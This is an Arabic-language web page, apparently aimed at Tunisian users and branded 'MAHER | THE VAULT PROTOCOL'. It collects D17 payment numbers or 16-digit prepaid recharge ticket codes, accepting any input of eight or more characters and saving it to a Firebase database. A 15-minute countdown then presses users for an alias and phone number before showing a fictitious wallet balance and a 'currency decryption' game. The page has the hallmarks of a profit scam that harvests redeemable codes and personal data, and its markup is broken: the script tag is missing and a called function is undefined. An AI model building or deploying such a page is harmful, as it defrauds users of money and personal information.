<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAHER | THE VAULT PROTOCOL</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

    <style>
        :root { --neon-green: #00ff41; --dark-bg: #0a0a0a; --error-red: #ff3e3e; }
        body { background: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .vault-box { border: 2px solid var(--neon-green); padding: 30px; width: 90%; max-width: 450px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); text-align: center; background: #000; position: relative; }
        .timer { font-size: 3.5rem; color: var(--error-red); margin: 15px 0; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px var(--error-red); }
        input, select { background: #111; border: 1px solid var(--neon-green); color: #fff; padding: 12px; width: 100%; margin: 10px 0; box-sizing: border-box; outline: none; font-family: inherit; }
        button { background: var(--neon-green); color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 1.1rem; transition: 0.3s; margin-top: 10px; }
        button:hover { background: #000; color: var(--neon-green); border: 1px solid var(--neon-green); box-shadow: 0 0 15px var(--neon-green); }
        .hidden { display: none; }
        .stats { display: flex; justify-content: space-around; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; font-size: 0.9rem; }
        #system-msg { font-size: 0.8rem; color: #888; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="vault-box">
    <h1 style="letter-spacing: 10px; margin-bottom: 5px;">MAHER</h1>
    <div id="system-msg">PROTOCOL STATUS: WAITING FOR ACCESS KEY...</div>

    <div id="screen-pay">
        <p>الربح ليس للجميع.. ادفع 1 DT للمرور</p>
        <select id="pay-type">
            <option value="D17">تحويل D17 (رقم المعاملة)</option>
            <option value="Ticket">Ticket Recharge (16 رقم)</option>
        </select>
        <input type="text" id="pay-code" placeholder="أدخل الكود أو رقم العملية هنا">
        <button onclick="submitKey()">تفعيل بروتوكول العبور</button>
    </div>

    <div id="screen-profile" class="hidden">
        <div class="timer" id="timer">15:00</div>
        <p style="color: var(--error-red);">تحذير: أكمل البيانات قبل انتهاء الوقت</p>
        <input type="text" id="user-alias" placeholder="الاسم المستعار (Alias)">
        <input type="text" id="user-phone" placeholder="رقم الهاتف (D17)">
        <button onclick="saveProfile()">تأمين الهوية في THE VAULT</button>
    </div>

    <div id="screen-vault" class="hidden">
        <div class="stats">
            <div>VAULT: <span id="val-balance" style="color:#fff">1.000</span> DT</div>
            <div>POINTS: <span id="val-points" style="color:#fff">0</span></div>
        </div>
        <div id="game-zone">
            <p>فك تشفير العملة الرقمية اليومي</p>
            <div id="scrolling-numbers" style="font-size: 2.5rem; background: #111; padding: 20px; margin: 15px 0; border: 1px solid #333;">000000</div>
            <button onclick="playGame()" id="game-btn">تجميد التشفير</button>
        </div>
    </div>
</div>

    // --- إعدادات مشروعك M-TOKEN ---
    const firebaseConfig = {

        authDomain: "m-token-5ce65.firebaseapp.com",
        projectId: "m-token-5ce65",
        storageBucket: "m-token-5ce65.appspot.com",
        databaseURL: "https://m-token-5ce65-default-rtdb.firebaseio.com/" 
    };
    
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let timeLeft = 15 * 60;
    let timerId;
    let tempUserId = "";

    // وظيفة إرسال الكود
    function submitKey() {
        const type = document.getElementById('pay-type').value;
        const code = document.getElementById('pay-code').value;

        if (code.trim().length < 8) {
            alert("خطأ: الكود غير مكتمل أو غير صالح.");
            return;
        }

        tempUserId = "UID_" + Date.now();
        
        // حفظ طلب الدخول في Firebase للمراجعة
        database.ref('gate_entries/' + tempUserId).set({
            method: type,
            code_sent: code,
            time: new Date().toLocaleString(),
            status: "Pending Verification"
        });

        document.getElementById('screen-pay').classList.add('hidden');
        document.getElementById('screen-profile').classList.remove('hidden');
        document.getElementById('system-msg').innerText = "IDENTITY VERIFICATION IN PROGRESS...";
        startTimer();
    }

    // وظيفة المؤقت
    function startTimer() {
        timerId = setInterval(() => {
            let m = Math.floor(timeLeft / 60);
            let s = timeLeft % 60;
            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
            if (timeLeft <= 0) {
                clearInterval(timerId);
                alert("تنبيه: انتهى الوقت. تم تدمير مفتاح الوصول.");
                location.reload();
            }
            timeLeft--;
        }, 1000);
    }

    // وظيفة حفظ المستخدم النهائي
    function saveProfile() {
        const alias = document.getElementById('user-alias').value;
        const phone = document.getElementById('user-phone').value;

        if (!alias || !phone) { alert("أدخل بياناتك كاملة!"); return; }

        database.ref('members/' + tempUserId).set({
            alias: alias,
            phone: phone,
            joined: new Date().toLocaleString(),
            wallet: 1.000,
            points: 0
        });

        clearInterval(timerId);
        document.getElementById('screen-profile').classList.add('hidden');
        document.getElementById('screen-vault').classList.remove('hidden');
        document.getElementById('system-msg').innerText = "ACCESS GRANTED. WELCOME TO THE VAULT.";
    }
